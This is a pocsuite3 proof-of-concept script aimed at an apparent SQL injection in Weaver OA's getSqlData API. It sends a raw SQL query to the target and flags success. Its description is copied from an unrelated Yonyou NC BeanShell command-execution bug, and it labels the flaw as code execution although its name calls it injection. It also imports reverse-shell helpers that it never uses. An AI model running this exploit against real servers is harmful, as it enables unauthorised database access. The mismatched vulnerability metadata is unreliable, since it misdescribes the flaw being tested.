from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re
class DemoPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '泛微OA getSqlData 注入'
    appName = '泛微OA'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''用友 NC bsh.servlet.BshServlet 存在远程命令执行漏洞，通过BeanShell 执行远程命令获取服务器权限。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP


    def _verify(self):#验证模式
        result = {}
        try:
            target = self.url+"/Api/portal/elementEcodeAddon/getSqlData?sql=select user"
            r = requests.get(url=target,timeout=8,verify=False)
            if r.status_code == 200 and "true" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                result['verifyInfo']['Payload'] = "/Api/portal/elementEcodeAddon/getSqlData?sql=select user"
                return self.parse_output(result)
        except:
            return

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)